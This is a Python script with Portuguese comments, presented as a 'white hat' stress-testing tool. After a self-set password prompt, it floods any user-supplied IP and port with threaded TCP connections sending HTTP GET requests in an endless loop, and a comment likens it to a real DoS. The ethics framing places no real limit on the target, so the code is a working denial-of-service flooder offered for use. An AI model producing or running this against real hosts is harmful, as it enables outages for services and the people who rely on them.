import socket
import threading
import time

# --- CONFIGURAÇÃO DE SEGURANÇA E ÉTICA ---
SENHA_DE_REDE_MESTRE = "SUA_SENHA_SECRETA"  # MUDAR ISSO!
# ----------------------------------------

def fazer_requisicao_de_teste(alvo_ip, alvo_porta):
    """Função para enviar um único pacote de teste."""
    try:
        # Cria um socket TCP/IP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((alvo_ip, alvo_porta))
        
        # Simula um pacote simples (pode ser HTTP GET para teste web)
        pacote = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(alvo_ip).encode('ascii')
        s.send(pacote)
        
        # Imprime um sinal de vida para indicar que o pacote foi enviado
        # print(f"Pacote enviado para {alvo_ip}:{alvo_porta}")
        s.close()
    except Exception as e:
        # print(f"Erro de conexão/envio: {e}")
        pass # Silencia erros de conexão para simular a falha em um DoS real

def iniciar_teste_de_estresse():
    """Lógica principal para autenticação e início do teste."""
    
    # --- Passo 1: Autenticação de Segurança ---
    print("---------------------------------------")
    print("🔒 INÍCIO DO PROTOCOLO DE AUTORIZAÇÃO 🔒")
    print("Ferramenta dos Debuggers (Apenas White Hat)")
    print("---------------------------------------")
    
    senha_digitada = input("Digite a SENHA DA REDE MESTRE para autorizar o teste: ")
    
    if senha_digitada != SENHA_DE_REDE_MESTRE:
        print("\n❌ ACESSO NEGADO! Chave de segurança incorreta. Encerrando por ética.")
        return
    
    print("\n✅ ACESSO AUTORIZADO! Iniciando testes de estresse.")
    
    # --- Passo 2: Configuração do Alvo ---
    alvo_ip = input("Digite o IP de ALVO (ex: 127.0.0.1): ")
    try:
        alvo_porta = int(input("Digite a PORTA de ALVO (ex: 80): "))
        threads_max = int(input("Número de conexões simultâneas (Threads) para o teste: "))
    except ValueError:
        print("Porta e Threads devem ser números válidos.")
        return

    # --- Passo 3: Início do Flood Controlado ---
    print(f"\nTeste de Estresse iniciado em {alvo_ip}:{alvo_porta} com {threads_max} threads...")
    print("Pressione Ctrl+C a qualquer momento para PARAR o teste.")
    
    pacotes_enviados = 0
    try:
        while True:
            # Cria uma thread para cada pacote (simulando múltiplos usuários/conexões)
            t = threading.Thread(target=fazer_requisicao_de_teste, args=(alvo_ip, alvo_porta))
            t.start()
            pacotes_enviados += 1
            
            # Controle de taxa para não sobrecarregar a máquina do Debugger
            time.sleep(0.001) 
            
            if pacotes_enviados % 1000 == 0:
                 print(f"[{time.strftime('%H:%M:%S')}] Total de {pacotes_enviados} pacotes simulados...")

    except KeyboardInterrupt:
        print("\n\n🛑 TESTE INTERROMPIDO PELO USUÁRIO (Ctrl+C). Encerrando Debuggers.")
    except Exception as e:
        print(f"\nErro fatal: {e}")
        
if __name__ == "__main__":
    iniciar_teste_de_estresse()

